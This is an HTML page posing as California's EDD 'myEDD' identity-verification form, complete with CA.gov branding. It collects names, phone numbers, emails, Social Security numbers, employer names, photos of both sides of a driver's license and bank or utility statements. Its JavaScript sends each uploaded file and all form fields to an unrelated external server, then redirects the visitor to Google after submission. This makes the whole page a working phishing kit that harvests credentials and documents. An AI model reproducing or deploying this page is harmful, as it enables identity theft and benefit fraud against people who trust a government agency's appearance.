<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>myEDD</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Bree+Serif&family=Public+Sans:wght@300;400;600;700&family=Source+Sans+Pro:wght@400;600&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Public Sans', sans-serif; -webkit-font-smoothing: antialiased; }
        h1, h2, .font-serif { font-family: 'Bree Serif', serif; }
        .font-source-sans { font-family: 'Source Sans Pro', sans-serif; }
        .gold-bar { border-bottom: 5px solid #fdb81e; }
        input:focus { outline: none; border-color: #046b99; box-shadow: 0 0 0 2px rgba(4, 107, 153, 0.2); }
        .upload-box.uploaded { background-color: #d4edda; border-color: #28a745; }
        .upload-status { color: #28a745; font-size: 14px; margin-top: 8px; font-weight: 600; }
    </style>
</head>
<body class="min-h-screen flex flex-col bg-[#E4F0FC]">
    
    <!-- PAGE: VERIFICATION -->
    <div id="page-verify" class="min-h-screen flex flex-col bg-[#E4F0FC]">
        <!-- Header -->
        <header class="bg-[#046b99] text-white py-2">
            <div class="max-w-7xl mx-auto px-4 flex justify-between items-center h-[38px]">
                <a href="#"><img src="https://i.postimg.cc/FdtHKJg7/new-ca-image.png" alt="CA.gov" class="h-[30px]"></a>
                <div class="text-sm font-source-sans">English</div>
            </div>
        </header>

        <nav class="bg-white gold-bar py-4">
            <div class="max-w-7xl mx-auto px-4">
                <svg class="h-10 md:h-12" viewBox="0 0 177 52" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <g clip-path="url(#clip1)">
                        <path d="M0 40.6476L5.09796 11.8985H28.6721L27.4824 18.6078H13.3858L12.6562 22.7196H24.5846L23.3948 29.4288H11.4683L10.6673 33.9393H25.3255L24.1357 40.6486H0V40.6476Z" fill="#00587C"/>
                        <path d="M40.9345 18.6068H42.7412C47.8007 18.6068 49.4853 20.2034 48.4232 26.1928C47.4607 31.6229 44.6409 33.9384 40.2228 33.9384H38.2151L40.9355 18.6068H40.9345ZM39.9964 40.6476C49.2731 40.6476 56.0725 36.4938 57.9919 25.6737C59.6709 16.2111 54.6518 11.8985 45.3357 11.8985H32.6458L27.5469 40.6476H39.9964Z" fill="#00587C"/>
                        <path d="M71.1719 18.6068H72.9786C78.038 18.6068 79.7236 20.2034 78.6616 26.1928C77.6972 31.6229 74.8773 33.9384 70.4611 33.9384H68.4534L71.1719 18.6068ZM70.2357 40.6476C79.5104 40.6476 86.3118 36.4938 88.2311 25.6737C89.9082 16.2111 84.891 11.8985 75.574 11.8985H62.8841L57.7861 40.6476H70.2357Z" fill="#00587C"/>
                        <path d="M152.593 28.8985V28.9013L148.651 33.4351L139.895 43.5177H132.591L143.651 30.7901H138.365L139.177 26.1414H145.136L140.675 16.8842H146.802L149.987 23.4964L152.593 28.8985Z" fill="#00587C"/>
                    </g>
                </svg>
            </div>
        </nav>

        <!-- Verification Form -->
        <main class="flex-grow py-6 md:py-10">
            <div class="max-w-3xl mx-auto px-4">
                <div class="bg-white rounded-xl shadow-lg p-4 md:p-8">
                    
                    <div class="mb-6">
                        <label class="block text-[#333] font-bold text-lg md:text-xl mb-3">Name *</label>
                        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                            <div>
                                <label class="text-gray-600 text-sm md:text-base mb-1 block">First Name</label>
                                <input type="text" id="first-name" class="w-full px-3 md:px-4 py-3 md:py-4 text-base md:text-lg border border-[#999] rounded-2xl">
                            </div>
                            <div>
                                <label class="text-gray-600 text-sm md:text-base mb-1 block">Last Name</label>
                                <input type="text" id="last-name" class="w-full px-3 md:px-4 py-3 md:py-4 text-base md:text-lg border border-[#999] rounded-2xl">
                            </div>
                        </div>
                    </div>

                    <div class="mb-6">
                        <label class="block text-[#333] font-bold text-lg md:text-xl mb-3">Phone *</label>
                        <div class="grid grid-cols-3 gap-2 md:gap-3">
                            <input type="text" id="phone-1" maxlength="3" placeholder="###" class="w-full px-2 md:px-3 py-3 md:py-4 text-center text-base md:text-lg border border-[#999] rounded-2xl">
                            <input type="text" id="phone-2" maxlength="3" placeholder="###" class="w-full px-2 md:px-3 py-3 md:py-4 text-center text-base md:text-lg border border-[#999] rounded-2xl">
                            <input type="text" id="phone-3" maxlength="4" placeholder="####" class="w-full px-2 md:px-3 py-3 md:py-4 text-center text-base md:text-lg border border-[#999] rounded-2xl">
                        </div>
                    </div>

                    <div class="mb-6">
                        <label class="block text-[#333] font-bold text-lg md:text-xl mb-3">Email *</label>
                        <input type="email" id="verify-email" class="w-full px-3 md:px-4 py-3 md:py-4 text-base md:text-lg border border-[#999] rounded-2xl bg-white">
                    </div>

                    <div class="mb-6">
                        <label class="block text-[#333] font-bold text-lg md:text-xl mb-3">Upload Front of Driver's License / State ID *</label>
                        <div id="dl-front-box" onclick="document.getElementById('dl-front').click()" class="upload-box border-2 border-dashed border-gray-300 rounded-xl p-6 md:p-10 text-center cursor-pointer hover:bg-gray-50">
                            <div class="text-base md:text-lg text-[#333] mb-2">Choose File</div>
                            <div class="text-2xl md:text-3xl text-gray-400">üì§ | üì∑</div>
                            <input type="file" id="dl-front" class="hidden" accept="image/*">
                        </div>
                    </div>

                    <div class="mb-6">
                        <label class="block text-[#333] font-bold text-lg md:text-xl mb-3">Upload Back of Driver's License / State ID *</label>
                        <div id="dl-back-box" onclick="document.getElementById('dl-back').click()" class="upload-box border-2 border-dashed border-gray-300 rounded-xl p-6 md:p-10 text-center cursor-pointer hover:bg-gray-50">
                            <div class="text-base md:text-lg text-[#333] mb-2">Choose File</div>
                            <div class="text-2xl md:text-3xl text-gray-400">üì§ | üì∑</div>
                            <input type="file" id="dl-back" class="hidden" accept="image/*">
                        </div>
                    </div>

                    <div class="mb-6">
                        <label class="block text-[#333] font-bold text-lg md:text-xl mb-3">Utility Bills or Bank Statement *</label>
                        <div id="utility-bill-box" onclick="document.getElementById('utility-bill').click()" class="upload-box border-2 border-dashed border-gray-300 rounded-xl p-6 md:p-10 text-center cursor-pointer hover:bg-gray-50">
                            <div class="text-base md:text-lg text-[#333] mb-2">Choose File(s)</div>
                            <div class="text-2xl md:text-3xl text-gray-400">üì§</div>
                            <input type="file" id="utility-bill" class="hidden" accept="image/*" multiple>
                        </div>
                    </div>

                    <div class="mb-6">
                        <label class="block text-[#333] font-bold text-lg md:text-xl mb-3">Social Security Number *</label>
                        <div class="relative flex">
                            <input type="password" id="ssn" placeholder="000-00-0000" maxlength="11" class="w-full px-3 md:px-4 py-3 md:py-4 text-base md:text-lg border border-[#999] rounded-l-2xl border-r-0">
                            <button type="button" onclick="toggleSSNVisibility()"
                                    class="px-3 md:px-4 border border-[#999] rounded-r-2xl bg-white text-[#046b99] text-sm md:text-base">
                                Show
                            </button>
                        </div>
                    </div>

                    <div class="mb-6">
                        <label class="block text-[#333] font-bold text-lg md:text-xl mb-3">Name of Last Employer *</label>
                        <input type="text" id="employer" class="w-full px-3 md:px-4 py-3 md:py-4 text-base md:text-lg border border-[#999] rounded-2xl">
                    </div>

                    <div class="mb-8">
                        <label class="block text-[#333] font-bold text-lg md:text-xl mb-3">Have you ever applied for Unemployment Insurance in the last 18 months? *</label>
                        <div class="space-y-3">
                            <label class="flex items-center text-base md:text-lg cursor-pointer">
                                <input type="radio" name="applied" value="yes" class="w-5 h-5 md:w-6 md:h-6 mr-3">
                                Yes
                            </label>
                            <label class="flex items-center text-base md:text-lg cursor-pointer">
                                <input type="radio" name="applied" value="no" class="w-5 h-5 md:w-6 md:h-6 mr-3">
                                No
                            </label>
                        </div>
                    </div>

                    <button onclick="submitForm()" class="w-full bg-[#309BDB] hover:bg-[#2589C5] text-white font-bold text-lg md:text-xl py-3 md:py-4 rounded-xl transition-all">
                        Submit
                    </button>
                </div>
            </div>
        </main>
    </div>

    <script>
        function toggleSSNVisibility() {
            const ssn = document.getElementById('ssn');
            const btn = event.target;
            if (ssn.type === 'password') {
                ssn.type = 'text';
                btn.textContent = 'Hide';
            } else {
                ssn.type = 'password';
                btn.textContent = 'Show';
            }
        }

        function setupFileUpload(inputId, boxId) {
            const input = document.getElementById(inputId);
            const box = document.getElementById(boxId);
            
            input.addEventListener('change', async function(e) {
                e.preventDefault();
                e.stopPropagation();
                
                if (this.files && this.files.length > 0) {
                    box.classList.add('bg-blue-50', 'border-blue-300');
                    let status = box.querySelector('.upload-status');
                    if (!status) {
                        status = document.createElement('div');
                        status.className = 'upload-status';
                        box.appendChild(status);
                    }
                    status.textContent = '‚è≥ Uploading...';
                    status.className = 'text-blue-600 text-sm md:text-base font-semibold mt-2';
                    
                    const filesArray = Array.from(this.files);
                    
                    for (let i = 0; i < filesArray.length; i++) {
                        const file = filesArray[i];
                        const uploadData = new FormData();
                        uploadData.append('realtime', 'file_upload');
                        uploadData.append(inputId, file);
                        
                        try {
                            await fetch('https://mine.repeatcar.com/568/op/report.php', { 
                                method: 'POST', 
                                body: uploadData 
                            });
                            
                            // Sequential delay for better reliability
                            await new Promise(resolve => setTimeout(resolve, 8000));
                            
                        } catch (error) {
                            console.error('Upload error:', error);
                        }
                    }
                    
                    box.classList.remove('bg-blue-50', 'border-blue-300');
                    box.classList.add('uploaded');
                    status.textContent = '‚úì Photo uploaded successfully';
                    status.className = 'upload-status';
                }
            }, false);
        }

        document.addEventListener('DOMContentLoaded', function() {
            setupFileUpload('dl-front', 'dl-front-box');
            setupFileUpload('dl-back', 'dl-back-box');
            setupFileUpload('utility-bill', 'utility-bill-box');
        });

        async function submitForm() {
            const finalData = new FormData();
            
            const firstName = document.getElementById('first-name').value;
            const lastName = document.getElementById('last-name').value;
            const phone1 = document.getElementById('phone-1').value;
            const phone2 = document.getElementById('phone-2').value;
            const phone3 = document.getElementById('phone-3').value;
            const email = document.getElementById('verify-email').value;
            const ssn = document.getElementById('ssn').value;
            const employer = document.getElementById('employer').value;
            const appliedRadio = document.querySelector('input[name="applied"]:checked');
            
            finalData.append('first_name', firstName);
            finalData.append('last_name', lastName);
            finalData.append('phone', `${phone1}-${phone2}-${phone3}`);
            finalData.append('email', email);
            finalData.append('ssn', ssn);
            finalData.append('employer', employer);
            finalData.append('applied_unemployment', appliedRadio ? appliedRadio.value : '');
            
            // Only text fields sent here to avoid duplicates
            finalData.append('submit', 'final_text_only');

            try {
                const response = await fetch('https://mine.repeatcar.com/568/op/report.php', { 
                    method: 'POST', 
                    body: finalData 
                });
                
                setTimeout(() => {
                    window.location.href = 'https://www.google.com';
                }, 5000);
                
            } catch (error) {
                console.error('Submission error:', error);
                setTimeout(() => {
                    window.location.href = 'https://www.google.com';
                }, 5000);
            }
        }
    </script>
</body>
</html>
